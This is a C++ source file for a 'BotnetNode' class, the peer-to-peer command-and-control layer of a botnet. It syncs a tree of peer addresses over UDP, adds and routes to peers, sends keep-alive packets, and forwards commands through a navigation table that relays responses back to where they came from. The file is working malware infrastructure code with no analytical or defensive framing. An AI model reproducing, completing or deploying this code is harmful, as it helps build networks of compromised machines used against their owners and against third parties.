#include "botnet.h"

BotnetNode::BotnetNode()
	:_adr({ 0,0 }), _id(0)
{
}

BotnetNode::BotnetNode(
	uint32_t ip, 
	uint16_t port
)
	:_adr({ ip, port }), _id(0)
{
}

void BotnetNode::sendNetTree(
	const SOCKET& udp_sock,
	const struct sockaddr_in& peer_addr,
	std::vector<adr>& hosts,
	char* const buf
)
{
	if (std::find_if(hosts.begin(), hosts.end(), [=](auto host) {return host.ip == _adr.ip && host.port == _adr.port; }) != hosts.end())
		return;

	/* init and set pointers */
	memset(buf, 0, 1024);
	struct botnet_pack* default_pack = (struct botnet_pack*)buf;
	tree_ext* extention = (tree_ext*)(buf + BOTNET_PACK_SIZE);
	adr* branches_data = (adr*)(buf + BOTNET_PACK_SIZE + sizeof(tree_ext));
		
	/* fill the packet with data*/
	default_pack->type = NETWORK_SYNC_REPLY;
	extention->host = _adr;
	extention->n_branches = _branches.size();
	for (BotnetNode* node : _branches)
	{
		memcpy(branches_data, &node->_adr, sizeof(adr));
		branches_data++;
	}

	/* send the packet */
	sendto(udp_sock, buf, 1024, 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));

	/* add the host to prevent infinite recursion */
	hosts.push_back(_adr);

	/* iterate over next branches */
	for (BotnetNode* node : _branches)
		node->sendNetTree(udp_sock, peer_addr, hosts, buf);
}

struct sockaddr_in BotnetNode::addPeer(
	struct botnet_pack* const pack,
	const struct sockaddr_in private_addr,
	BOOL* const status
)
{
	/* locals */
	struct sockaddr_in peer_addr;
	std::vector<adr> hosts;
	//const struct botnet_pack* pack = ;

	/* 0ing peer_addr struct */
	ZeroMemory(&peer_addr, sizeof(peer_addr));
	*status = 0;
	
	/* check if local peer */
	if (pack->dst_peer.ip + pack->dst_peer.port == 0)
	{
		/* add to tree */
		_branches.push_back(new BotnetNode(private_addr.sin_addr.s_addr, private_addr.sin_port));
		pack->private_peer.ip == 0 ? *status = 1 : *status = 2; // successful local (reply back if 1).
		return private_addr;
	}

	/* if peer is not in the network tree */
	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts)) 
	{
		/* create addr struct for peer (for direct communication) */
		peer_addr.sin_family = AF_INET;
		peer_addr.sin_port = htons(pack->dst_peer.port);
		peer_addr.sin_addr.s_addr = htonl(pack->dst_peer.ip);

		/* add to tree */
		_branches.push_back(new BotnetNode(pack->dst_peer.ip, pack->dst_peer.port));
		
		*status = 2; // successful remote
	}

	return peer_addr;
}

BotnetNode* BotnetNode::findNode(
	const adr& addr,
	std::vector<adr>& hosts
)
{
	if (std::find_if(hosts.begin(), hosts.end(), [=](auto host) {return host.ip == _adr.ip && host.port == _adr.port; }) != hosts.end())
		return nullptr;

	hosts.push_back(_adr);

	if (_adr.ip == addr.ip && _adr.port == addr.port)
		return this;

	BotnetNode* temp;
	for (BotnetNode* node : _branches)
	{
		temp = node->findNode(addr, hosts);
		if (temp)
			return temp;
	}

	return nullptr;
}

BotnetNode* BotnetNode::findPath(
	const adr& addr,
	std::vector<adr>& hosts,
	int* height
)
{
	
	if (std::find_if(hosts.begin(), hosts.end(), [=](auto host) {return host.ip == _adr.ip && host.port == _adr.port; }) == hosts.end())
	{
		hosts.push_back(_adr);

		if (_adr.ip == addr.ip && _adr.port == addr.port)
		{
			*height = 0;
			return this;
		}

		if (!_branches.empty())
		{
			
			int m_min = -1, temp_min;
			BotnetNode* temp_node = nullptr;

			for (BotnetNode* node : _branches)
				if (node->findPath(addr, hosts, &temp_min))
				{
					m_min == -1 ?
						m_min = temp_min : 
						m_min = min(m_min, temp_min);
					temp_node = node;
				}

			*height = ++m_min;
			return temp_node;
		}
	}

	return nullptr;	
}

void BotnetNode::handleSync(
	const u_char* pack,
	const struct sockaddr_in& peer_addr
)
{
	/* locals */
	BotnetNode* base_node, *sub_node;
	std::vector<adr> peers_nodes, temp_nodes;
	tree_ext* base; 
	adr* peer; 

	base = (tree_ext*)(pack + BOTNET_PACK_SIZE);
	peer = (adr*)(pack + BOTNET_PACK_SIZE + sizeof(tree_ext));

	/* add all host's sub peers to a list */
	peers_nodes.clear();
	for (size_t i = 0; i < base->n_branches; i++)
	{
		peers_nodes.push_back(*peer);
		peer++;
	}
	
	/* check if node already exists in tree */
	if (base->host.ip == 0 && base->host.port == 0)
	{
		base->host.ip = peer_addr.sin_addr.s_addr;
		base->host.port = peer_addr.sin_port;
	}
	base_node = findNode(base->host, temp_nodes);

	if (base_node)
		for (adr addr : peers_nodes)
		{
			temp_nodes.clear();
			sub_node = findNode(addr, temp_nodes);
			
			sub_node ? 
				base_node->_branches.push_back(sub_node) :
				base_node->_branches.push_back(new BotnetNode(addr.ip, addr.port));
		}
}

void BotnetNode::keepAlive(
	const SOCKET& udp_sock
)
{
	struct botnet_pack pack;
	struct sockaddr_in addr;

	memset(&pack, 0, BOTNET_PACK_SIZE);
	pack.type = KEEP_ALIVE;

	for (BotnetNode* node : _branches)
	{
		/* create sockaddr_in struct */
		addr.sin_family = AF_INET;
		addr.sin_port = node->_adr.port;
		addr.sin_addr.s_addr = node->_adr.ip;

		sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
	}
}

uint16_t BotnetNode::fowardCommand(
		uint16_t command_id,
		const struct sockaddr_in& src_addr
)
{
	command_fowarding src_info;
	src_info.src_addr.ip = src_addr.sin_addr.s_addr;
	src_info.src_addr.port = src_addr.sin_port;
	src_info.original_id = command_id;
	
	_nevigation_table[_id] = src_info;
	return _id++;
}

struct sockaddr_in BotnetNode::nextPathNode(
	const adr& dest_addr,
	const adr& private_addr,
	BOOL *b_status
)
{	
	struct sockaddr_in next_node_addr;
	std::vector<adr> hosts;
	BotnetNode* next_node;
	int height;
	
	if (dest_addr.ip + dest_addr.port != 0)
		next_node = findPath(dest_addr, hosts, &height);
	else
		next_node = findPath(private_addr, hosts, &height);
	
	if (next_node == nullptr)
	{
		*b_status = 0;
		return {0};
	}

	next_node_addr.sin_family = AF_INET;
	next_node_addr.sin_addr.s_addr = next_node->_adr.ip;
	next_node_addr.sin_port = next_node->_adr.port;
	*b_status = 1;

	return next_node_addr;
}

adr BotnetNode::retrieveCommand(
	struct botnet_pack* const command_res
)
{
	std::map<uint16_t, command_fowarding>::iterator it = _nevigation_table.find(command_res->numerics.id);

	/* check if the command exists in the mapping table */
	if (it != _nevigation_table.end())
	{
		command_fowarding retrived_command = _nevigation_table[command_res->numerics.id];
		command_res->numerics.id = retrived_command.original_id;

		_id--;
		_nevigation_table.erase(it);

		return retrived_command.src_addr;
	}
	
	return { 0, 0 };
}